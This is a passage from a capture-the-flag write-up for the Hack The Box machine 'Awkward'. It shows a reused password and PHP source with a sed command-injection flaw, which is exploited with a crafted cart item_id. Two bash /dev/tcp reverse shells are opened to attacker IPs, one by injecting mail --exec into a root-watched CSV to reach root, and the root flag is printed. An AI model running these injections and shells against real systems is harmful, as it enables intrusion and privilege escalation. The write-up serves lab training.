-rw-r--r-- 1 root root 44 Sep 15 22:34 /etc/nginx/conf.d/.htpasswd
bean@awkward:~$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

This is the ```.htaccess``` of ```store.hat-valley.htb``` vhost:

![store.JPG](images/store.JPG)

We are not able to crack this password using ```rockyou.txt``` but reuse the ```bean``` password ```014mrbeanrules!#P``` works:

![storeadmin.JPG](images/storeadmin.JPG)

By observing the source code of ```store``` application we can see the following file:
```console
bean@awkward:/var/www/store$ ls
cart              cart.php      css    img        js               README.md  static
cart_actions.php  checkout.php  fonts  index.php  product-details  shop.php   style.css
bean@awkward:/var/www/store$ cat cart_actions.php
<?php

$STORE_HOME = "/var/www/store/";

//check for valid hat valley store item
function checkValidItem($filename) {
    if(file_exists($filename)) {
        $first_line = file($filename)[0];
        if(strpos($first_line, "***Hat Valley") !== FALSE) {
            return true;
        }
    }
    return false;
}

//add to cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//fetch from cart
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_GET['action'] === 'fetch_items' && $_GET['user']) {
    $html = "";
    $dir = scandir("{$STORE_HOME}cart");
    $files = array_slice($dir, 2);

    foreach($files as $file) {
        $user_id = substr($file, -18);
        if($user_id === $_GET['user'] && checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
            $product_file = fopen("{$STORE_HOME}cart/{$file}", "r");
            $details = array();
            while (($line = fgets($product_file)) !== false) {
                if(str_replace(array("\r", "\n"), '', $line) !== "***Hat Valley Cart***") { //don't include first line
                    array_push($details, str_replace(array("\r", "\n"), '', $line));
                }
            }
            foreach($details as $cart_item) {
                 $cart_items = explode("&", $cart_item);
                 for($x = 0; $x < count($cart_items); $x++) {
                      $cart_items[$x] = explode("=", $cart_items[$x]); //key and value as separate values in subarray
                 }
                 $html .= "<tr><td>{$cart_items[1][1]}</td><td>{$cart_items[2][1]}</td><td>{$cart_items[3][1]}</td><td><button data-id={$cart_items[0][1]} onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'>Remove</button></td></tr>";
            }
        }
    }
    echo $html;
    exit;
}

?>
bean@awkward:/var/www/store$
```

On delete from cart action, we can see the call to ```system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");```.

We can use command injection to ```sed``` command by running our script using ```-e``` flag.

We can inject the command ```' -e "1e /path/to/shell.sh" /path/to/shell.sh``` so the script will be ```system("sed -i '/item_id=' -e "1e /path/to/shell.sh" /path/to/shell.sh '/d' {$STORE_HOME}cart/{$user_id}");```

Let's try it locally:
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ cat test.sh 
ifconfig
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ sed -i '/item_id=1' -e "1e /hackthebox/Awkward/test.sh" /hackthebox/Awkward/test.sh ' /d' /hackthebox/Awkward/store/store/cart/c2bd-2b57-a74-442e
sed: can't read /item_id=1: No such file or directory
sed: can't read  /d: No such file or directory
/hackthebox/Awkward/test.sh: 1: cannot open UP,BROADCAST,RUNNING,MULTICAST: No such file
/hackthebox/Awkward/test.sh: 2: inet: not found
/hackthebox/Awkward/test.sh: 4: Syntax error: newline unexpected
```

And it works.

So first let's create a reverse shell on the target machine:
```console
bean@awkward:~$ ls -ltr rev.sh 
-rwxrwxrwx 1 bean bean 32 Nov 27 00:27 rev.sh
bean@awkward:~$ cat rev.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.3/4242 0>&1
```

Next, We need to add an item to the cart:

![cartitem.JPG](images/cartitem.JPG)

We can see the item on ```/var/www/store/cart```:
```console
bean@awkward:/var/www/store/cart$ ls -ltr
total 4
-rw-r--r-- 1 www-data www-data 95 Nov 27 00:28 c2bd-2b57-a74-442e
bean@awkward:/var/www/store/cart$ cat c2bd-2b57-a74-442e 
***Hat Valley Cart***
item_id=2&item_name=Palm Tree Cap&item_brand=Kool Kats&item_price=$48.50
```

Now we can change the ```item_id``` to ```' -e "1e /home/bean/rev.sh" /home/bean/rev.sh '``` (We are not able to edit the file so we need to create it again):
```console
bean@awkward:/var/www/store/cart$ cat c2bd-2b57-a74-442e 
***Hat Valley Cart***
item_id=2' -e "1e /home/bean/rev.sh" /home/bean/rev.sh '&item_name=Palm Tree Cap&item_brand=Kool Kats&item_price=$48.50
```

And now we need to delete the item from the cart:

![removeitem.JPG](images/removeitem.JPG)

And we get a reverse shell as ```www-data```:
```console
nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from hat-valley.htb [10.10.11.185] 58344
bash: cannot set terminal process group (1398): Inappropriate ioctl for device
bash: no job control in this shell
www-data@awkward:~/store$ 
```

### Root

By observing the process list we can see the following process:
```console
root         992  0.0  0.0   2988  1168 ?        S    09:13   0:00  _ inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
root         993  0.0  0.0  18624  1804 ?        S    09:13   0:00  _ /bin/bash /root/scripts/notify.sh
```

We can see the ```root``` user runs the script ```/bin/bash /root/scripts/notify.sh``` to possibly notify about changes on ```/var/www/private/leave_requests.csv``` file.

Let's run ```pspy64``` and change the CSV file to see which process ```root``` user runs.

By changing the CSV file we can see the following process on ```pspy64```:
```console
www-data@awkward:~/private$ echo "bean1.hill,Inevitable1 break from Chris after Japan,14/08/20221,29/08/2022,No" >> /var/www/private/leave_requests.csv

2022/11/27 06:18:46 CMD: UID=0    PID=69726  | /bin/bash /root/scripts/notify.sh 
2022/11/27 06:18:46 CMD: UID=0    PID=69727  | mail -s Leave Request: bean1.hill christine 
2022/11/27 06:18:46 CMD: UID=0    PID=69728  | /usr/sbin/sendmail -oi -f root@awkward -t 
```

As we can see, It sends mail with the first CSV column.

By reading [https://gtfobins.github.io/gtfobins/mail/](https://gtfobins.github.io/gtfobins/mail/) we can see that we can do command injection using ```--exec``` flag as following:
```console
www-data@awkward:~/store$ cat /home/bean/rev2.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.14/4444 0>&1
www-data@awkward:~/store$ echo '" --exec="\!/home/bean/rev2.sh",Inevitable1 break from Chris after Japan,14/08/20221,29/08/2022,No' >> /var/www/private/leave_requests.csv
```

And we get a reverse shell as ```root```:
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from hat-valley.htb [10.10.11.185] 48416
bash: cannot set terminal process group (983): Inappropriate ioctl for device
bash: no job control in this shell
root@awkward:~/scripts# cat /root/root.txt
cat /root/root.txt
519da8983df4e7813c1e9d8db3c38039
```

And we get the root flag ```519da8983df4e7813c1e9d8db3c38039```.

